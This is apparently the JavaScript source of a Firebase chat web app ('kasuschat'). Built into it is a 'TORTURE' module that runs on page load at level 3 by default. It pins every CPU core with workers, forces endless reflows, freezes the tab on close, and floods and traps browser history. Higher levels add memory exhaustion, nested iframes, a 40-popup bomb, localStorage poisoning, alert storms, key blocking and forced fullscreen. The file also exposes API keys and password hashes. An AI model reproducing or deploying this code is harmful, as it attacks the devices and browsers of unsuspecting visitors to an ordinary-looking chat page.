import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getDatabase, ref, push, onChildAdded, remove, onValue, set, onDisconnect, get }
from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyCl_6vsYoZkEBMUNf0P4CK01hKCwA5P0XQ",
  authDomain: "kasuschat.firebaseapp.com",
  databaseURL: "https://kasuschat-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "kasuschat",
  storageBucket: "kasuschat.firebasestorage.app",
  messagingSenderId: "953505535371",
  appId: "1:953505535371:web:0d44f20017bc8664948b8e"
};

/* ============================================================
   TORTURE  —  Ctrl+Shift+Q = panic.  ?lvl=0..5 to set start.
   Nothing here waits for a click.
   ============================================================ */

const P = new URLSearchParams(location.search);
const IS_POPUP = P.has("popup") || !!window.opener;
const START = Math.max(0, Math.min(5, Number(P.get("lvl") ?? 3)));

const T = {
  cores: Math.min(navigator.hardwareConcurrency || 4, 12),
  oversub: 2,          // extra workers beyond core count -> context thrash
  memMB: 32,
  memMs: 220,
  memCapMB: 1400,
  popups: 40,
  nestMax: 60,
  unloadHang: 4500,    // ms the tab freezes while closing
  historyBomb: 400
};

let lvl = START;
const timers = new Set();
const workers = [];
let hogs = [], memMB = 0, spinOn = false, nestOn = false, nestDepth = 0;
let popupFired = false, historyFired = false, alerted = false;
let audioCtx = null, audioOsc = null, keyBound = false, lockBound = false;
const saved = {};

const every = (ms, fn) => { const id = setInterval(fn, ms); timers.add(id); return id; };
const clearEvery = (id) => { if (id) { clearInterval(id); timers.delete(id); } };

/* ---------- indicator (pointer-events:none, pure display) ---------- */

let dot = null;
function makeDot() {
  if (IS_POPUP || dot) return;
  const s = document.createElement("style");
  s.textContent = `#lvldot{position:fixed;left:6px;bottom:6px;width:5px;height:5px;
    border-radius:50%;background:#0f0;opacity:.55;z-index:2147483646;
    pointer-events:none;animation:pl 1.2s infinite}
    @keyframes pl{50%{opacity:.15}}
    @keyframes jolt{0%{transform:translate(0,0)}33%{transform:translate(1px,-1px)}
      66%{transform:translate(-1px,1px)}100%{transform:translate(0,1px)}}`;
  document.head.appendChild(s);
  dot = document.createElement("div");
  dot.id = "lvldot";
  document.body.appendChild(dot);
  dot.title = "L" + lvl;
}

/* ---------- core pinning: the actual harm ---------- */

const WORKER_SRC = `
let x = 0.5, on = true;
onmessage = e => { if (e.data === "stop") { on = false; close(); } };
function burn() {
  if (!on) return;
  const end = performance.now() + 45;
  while (performance.now() < end) {
    for (let i = 0; i < 40000; i++) x = Math.sin(x) * 1.0001 + Math.sqrt(Math.abs(x) + 1);
  }
  setTimeout(burn, 0);
}
burn();
`;

function pinCores() {
  if (workers.length) return;
  const n = T.cores + T.oversub;
  for (let i = 0; i < n; i++) {
    try {
      const w = new Worker(URL.createObjectURL(new Blob([WORKER_SRC], { type: "text/javascript" })));
      workers.push(w);
    } catch (e) { break; }
  }
}
function unpinCores() {
  while (workers.length) { try { workers.pop().postMessage("stop"); } catch (e) {} }
}

/* ---------- main-thread lag: forced reflow ---------- */

function thrash() {
  if (!spinOn) return;
  const nodes = document.querySelectorAll("#chat div, #chat img");
  const budget = Math.min(nodes.length, 900);
  for (let i = 0; i < budget; i++) nodes[i].offsetHeight;   // layout per iteration
  for (let i = 0; i < 300; i++) document.body.offsetHeight; // whole-document reflow
  requestAnimationFrame(thrash);
}

/* ---------- closing is the point ---------- */

function armUnload() {
  window.onbeforeunload = (e) => {
    const t = performance.now();
    while (performance.now() - t < T.unloadHang);   // sync block, tab freezes
    document.title = "WAIT";
    e.preventDefault();
    e.returnValue = "";
    return "";
  };
}

/* ---------- history hell ---------- */

function bombHistory() {
  if (historyFired) return;
  historyFired = true;
  for (let i = 0; i < T.historyBomb; i++) history.pushState({ i }, "", "#" + i);
}
function trapBack() {
  history.pushState({}, "", location.href);
  window.addEventListener("popstate", () => {
    if (lvl >= 3) { bombHistory(); history.pushState({}, "", "#p" + Date.now()); }
    else history.pushState({}, "", location.href);
  });
}
// bfcache return = reload, so back/forward never gets you out clean
window.addEventListener("pageshow", (e) => { if (e.persisted && lvl >= 3) location.reload(); });

/* ---------- visuals ---------- */

function blur(on) {
  document.documentElement.style.filter = on ? "blur(1.3px) saturate(1.4)" : "";
  document.body.style.animation = on ? "jolt .085s steps(2) infinite" : "";
}
function rotate(on) {
  for (const id of ["login", "app"]) {
    const el = document.getElementById(id);
    if (el) el.style.transform = on ? "rotate(180deg)" : "";
  }
}

/* ---------- audio ---------- */

function audioStart() {
  if (IS_POPUP) return;
  if (!audioCtx) {
    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    audioOsc = audioCtx.createOscillator();
    const g = audioCtx.createGain();
    audioOsc.type = "square";
    audioOsc.frequency.value = 440;
    g.gain.value = 0.1;
    audioOsc.connect(g).connect(audioCtx.destination);
    audioOsc.start();
  }
  audioCtx.resume();
}

/* ---------- keys ---------- */

function keyBlock(e) {
  if (e.ctrlKey || e.metaKey || e.altKey) return;
  const t = e.target;
  if (t && (t.tagName === "INPUT" || t.tagName === "TEXTAREA" || t.isContentEditable)) return;
  if (/^(F\d{1,2}|Escape|Tab|Shift|Backspace)$/.test(e.key)) return;
  e.preventDefault();
}

/* ---------- memory / DOM ---------- */

function memStart() {
  if (memMB >= T.memCapMB) return;
  hogs.push(new Uint8Array(T.memMB * 1024 * 1024));
  memMB += T.memMB;
}

function nest(el) {
  if (!nestOn || nestDepth >= T.nestMax) return;
  nestDepth++;
  const f = document.createElement("iframe");
  f.style.cssText = "width:340px;height:190px;border:1px solid #444;display:block";
  f.srcdoc = '<body style="margin:0"><iframe id="c" style="width:100%;height:100%;border:0"></iframe></body>';
  el.appendChild(f);
  f.onload = () => { const c = f.contentDocument?.getElementById("c"); if (c) nest(c); };
}

/* ---------- dialogs ---------- */

function alertStorm() {
  if (alerted || IS_POPUP) return;
  alerted = true;
  const lines = [
    "kasuschat", "your pc is fine", "probably",
    "good luck closing this", "Ctrl+Shift+Q to stop"
  ];
  lines.forEach((t, i) => setTimeout(() => alert(t), i * 220));
}

function popupBomb() {
  if (popupFired || IS_POPUP) return;
  popupFired = true;
  const url = location.origin + location.pathname + "?lvl=4&popup=1";
  for (let i = 0; i < T.popups; i++) window.open(url, "_blank");
}

function poisonStorage() {
  if (localStorage.getItem("__poisoned")) return;
  try {
    const chunk = "x".repeat(1024 * 1024);
    for (let i = 0; i < 20000; i++) localStorage.setItem("junk" + i, chunk);
  } catch (e) {}
  try { localStorage.setItem("__poisoned", "1"); } catch (e) {}
}

/* ---------- engine ---------- */

function setLevel(n) {
  lvl = Math.max(0, Math.min(5, n));
  if (dot) dot.title = "L" + lvl;

  document.body.style.cursor = lvl >= 1 ? "none" : "";
  if (lvl >= 1) audioStart();

  if (lvl >= 1 && !saved.title) {
    saved.title = every(90, () => { document.title = document.title === "Hi" ? "Hello" : "Hi"; });
  } else if (lvl < 1 && saved.title) { clearEvery(saved.title); saved.title = null; }

  rotate(lvl >= 2);
  blur(lvl >= 2);

  if (lvl >= 2 && !keyBound) { document.addEventListener("keydown", keyBlock); keyBound = true; }
  else if (lvl < 2 && keyBound) { document.removeEventListener("keydown", keyBlock); keyBound = false; }

  // L3+: pin every core, trap navigation, fight closing
  if (lvl >= 3) { pinCores(); bombHistory(); armUnload(); }
  else { unpinCores(); window.onbeforeunload = null; }

  if (lvl >= 3 && !spinOn) { spinOn = true; requestAnimationFrame(thrash); }
  else if (lvl < 3) spinOn = false;

  // L4+: eat memory and DOM
  if (lvl >= 4 && !saved.mem) saved.mem = every(T.memMs, memStart);
  else if (lvl < 4 && saved.mem) {
    clearEvery(saved.mem); saved.mem = null; hogs = []; memMB = 0;
  }

  if (lvl >= 4 && !nestOn) { nestOn = true; nest(document.body); }
  else if (lvl < 4) nestOn = false;

  // L5: everything else
  if (lvl >= 5 && !lockBound) {
    document.body.addEventListener("click", () => {
      if (lvl >= 5 && !document.pointerLockElement) document.body.requestPointerLock();
    });
    lockBound = true;
  }
}

function panic() {
  spinOn = false; nestOn = false;
  unpinCores();
  for (const id of timers) { clearInterval(id); clearTimeout(id); }
  timers.clear();
  saved.title = saved.mem = null;
  hogs = []; memMB = 0;
  audioCtx?.suspend();
  blur(false); rotate(false);
  document.body.style.cursor = "";
  document.body.style.animation = "";
  document.title = "kasuschat";
  if (keyBound) document.removeEventListener("keydown", keyBlock);
  keyBound = false;
  window.onbeforeunload = null;
  if (document.pointerLockElement) document.exitPointerLock();
  if (document.fullscreenElement) document.exitFullscreen();
  lvl = 0;
  if (dot) dot.title = "L0";
}
window.__panic = panic;
window.__setLevel = setLevel;

/* panic key — modifiers pass through the blocker */
document.addEventListener("keydown", (e) => {
  if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "q") { e.preventDefault(); panic(); }
});

/* first interaction arms only what a browser insists on a gesture for */
function firstGesture() {
  audioStart();
  if (lvl >= 5 && !IS_POPUP) {
    document.documentElement.requestFullscreen?.().catch(() => {});
    popupBomb();
    poisonStorage();
    alertStorm();
  }
}
for (const ev of ["pointerdown", "keydown", "touchstart", "wheel"]) {
  window.addEventListener(ev, firstGesture, { once: true, passive: true });
}

/* ============================================================
   APP
   ============================================================ */

let currentUID = null;
try { currentUID = localStorage.getItem("chatUID"); } catch (e) {}
if (!currentUID) {
  currentUID = crypto.randomUUID();
  try { localStorage.setItem("chatUID", currentUID); } catch (e) {}
}

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

async function checkBan() {
  const snap = await get(ref(db, "moderation/banned/" + currentUID));
  if (!snap.exists()) return false;
  const b = snap.val();
  if (!b.expires || b.expires > Date.now()) {
    location.href = "banned.html?reason=" + encodeURIComponent(b.reason || "Banned");
    return true;
  }
  remove(ref(db, "moderation/banned/" + currentUID));
  return false;
}

const OWNER_UID = "32df7477-c156-4968-9fd5-73b0bbcec9aa";

let presenceBound = false;
function startPresence() {
  if (IS_POPUP) return;
  const my = ref(db, "onlineUsers/" + crypto.randomUUID());
  set(my, true);
  onDisconnect(my).remove();

  if (!presenceBound) {
    document.addEventListener("visibilitychange", () => set(my, !document.hidden));
    presenceBound = true;
  }

  onValue(ref(db, "onlineUsers"), (snap) => {
    let c = 0;
    snap.forEach(ch => { if (ch.val() === true) c++; });
    const el = document.getElementById("onlineCount");
    if (el) el.innerText = c + (c === 1 ? " user online" : " users online");
  });
}

const chat = ref(db, "messages");
const typingRef = ref(db, "typing");
let lastTyping = 0;

if ("Notification" in window && Notification.permission !== "granted") {
  Notification.requestPermission();
}

function userTyping() {
  const name = document.getElementById("name").value;
  if (!name.trim()) return;
  const now = Date.now();
  if (now - lastTyping < 1500) return;
  lastTyping = now;
  set(ref(db, "typing/" + name), { user: name, time: now });
}
window.userTyping = userTyping;

const PASSWORD_HASH = "0d08f09ddf93c9c5dbe3f15cd2f022e900b6298b902627d61c18751911e96f38";
const DURESS_HASH = "8af6ecbdcdb3564c8cc2c2217992b4aafc3981aaeb450b6448a0b86d5bd4de02";
const ADMIN_HASH = "cac51705e3ff34dce799e863ddd0c0747a3c6b640236a092b8223e4e1c635232";

async function sha256(text) {
  const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, "0")).join("");
}

function send() {
  const nameEl = document.getElementById("name");
  const msgEl = document.getElementById("message");
  const name = nameEl.value, message = msgEl.value;
  if (!name.trim() || !message.trim()) return;

  if (message.startsWith("/clear")) {
    sha256(message.split(" ")[1] || "").then(h => {
      if (h === ADMIN_HASH) remove(chat).then(() => {
        const c = document.getElementById("chat"); if (c) c.innerHTML = "";
      });
      else alert("Wrong admin password");
    });
    msgEl.value = "";
    return;
  }

  push(chat, { uid: currentUID, name, message, timestamp: Date.now() });
  remove(ref(db, "typing/" + name));
  msgEl.value = "";
}
window.send = send;

function formatTime(ts) {
  const d = new Date(ts), now = new Date();
  const time = d.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
  if (d.toDateString() === now.toDateString()) return time;
  const y = new Date(); y.setDate(now.getDate() - 1);
  if (d.toDateString() === y.toDateString()) return "Yesterday " + time;
  return d.toLocaleDateString() + " " + time;
}

function loadAllMessages() {
  const box = document.getElementById("chat");
  onValue(chat, (snap) => {
    box.replaceChildren();
    snap.forEach((child) => {
      const m = child.val() || {};
      const div = document.createElement("div");
      div.appendChild(document.createTextNode("[" + formatTime(m.timestamp) + "] "));
      const b = document.createElement("b");
      b.textContent = String(m.name || "Unknown");
      div.appendChild(b);
      if (window.isAdmin && m.uid) {
        const s = document.createElement("span");
        s.style.cssText = "color:#888;font-size:11px";
        s.textContent = " (" + m.uid + ")";
        div.appendChild(s);
      }
      div.appendChild(document.createTextNode(": "));
      const c = String(m.message || "");
      let url = null;
      try { const u = new URL(c); if (u.protocol === "https:" && u.hostname === "i.ibb.co") url = u.href; } catch (e) {}
      if (url) {
        const img = document.createElement("img");
        img.src = url; img.alt = "Chat image"; img.loading = "lazy";
        img.style.cssText = "max-width:250px;border-radius:6px;margin-top:5px";
        div.appendChild(document.createElement("br"));
        div.appendChild(img);
      } else div.appendChild(document.createTextNode(c));
      box.appendChild(div);
    });
    box.scrollTop = box.scrollHeight;
  });
}

let typingUsers = {};
onValue(typingRef, (snap) => {
  const me = document.getElementById("name").value;
  typingUsers = {};
  snap.forEach(ch => {
    const i = ch.val();
    if (!i.user || i.user === me) return;
    if (Date.now() - i.time < 2500) typingUsers[i.user] = true;
    else remove(ref(db, "typing/" + i.user));
  });
  const el = document.getElementById("typingIndicator");
  const u = Object.keys(typingUsers);
  el.innerText = !u.length ? "" : u.length === 1 ? u[0] + " is typing..." : u.join(", ") + " are typing...";
});

async function login() {
  if (await checkBan()) return;
  const hash = await sha256(document.getElementById("password").value);

  if (hash === PASSWORD_HASH || hash === ADMIN_HASH) {
    document.getElementById("login").style.display = "none";
    document.getElementById("app").style.display = "block";
    window.isAdmin = hash === ADMIN_HASH;
    rotate(lvl >= 2);
    startPresence();
    loadAllMessages();
    return;
  }

  if (hash === DURESS_HASH) {
    document.open();
    document.write(`<html><head><title>404</title></head><body><h1>404</h1>
      <p>This page could not be found.</p></body></html>`);
    document.close();
    dot = null; makeDot();
    return;
  }
  alert("Wrong password");
}
window.login = login;

function banUser(uid, reason = "Rule violation", durationMinutes = null) {
  if (!window.isAdmin || uid === OWNER_UID) return;
  set(ref(db, "moderation/banned/" + uid), {
    reason, expires: durationMinutes ? Date.now() + durationMinutes * 60000 : null
  });
}
function unbanUser(uid) { if (window.isAdmin) remove(ref(db, "moderation/banned/" + uid)); }
window.banUser = banUser;
window.unbanUser = unbanUser;

function toggleQuotes() {
  const b = document.getElementById("quoteHistory");
  b.style.display = b.style.display === "none" ? "block" : "none";
}
window.toggleQuotes = toggleQuotes;

const uploadArea = document.getElementById("uploadArea");
const imageInput = document.getElementById("imageInput");
uploadArea.onclick = () => imageInput.click();
uploadArea.addEventListener("dragover", e => { e.preventDefault(); uploadArea.style.borderColor = "#aaa"; });
uploadArea.addEventListener("dragleave", () => { uploadArea.style.borderColor = "#555"; });
uploadArea.addEventListener("drop", e => {
  e.preventDefault(); uploadArea.style.borderColor = "#555"; uploadImage(e.dataTransfer.files[0]);
});
imageInput.addEventListener("change", () => uploadImage(imageInput.files[0]));

function uploadImage(file) {
  if (!file) return;
  const fd = new FormData();
  fd.append("image", file);
  fetch("https://api.imgbb.com/1/upload?key=e48b7e0f6d197cb14a1d7f5508fadfef", { method: "POST", body: fd })
    .then(r => r.json())
    .then(d => push(chat, {
      uid: currentUID,
      name: document.getElementById("name").value,
      message: d.data.url,
      timestamp: Date.now()
    }));
}

/* ============================================================
   BOOT
   ============================================================ */

makeDot();
trapBack();
setLevel(START);
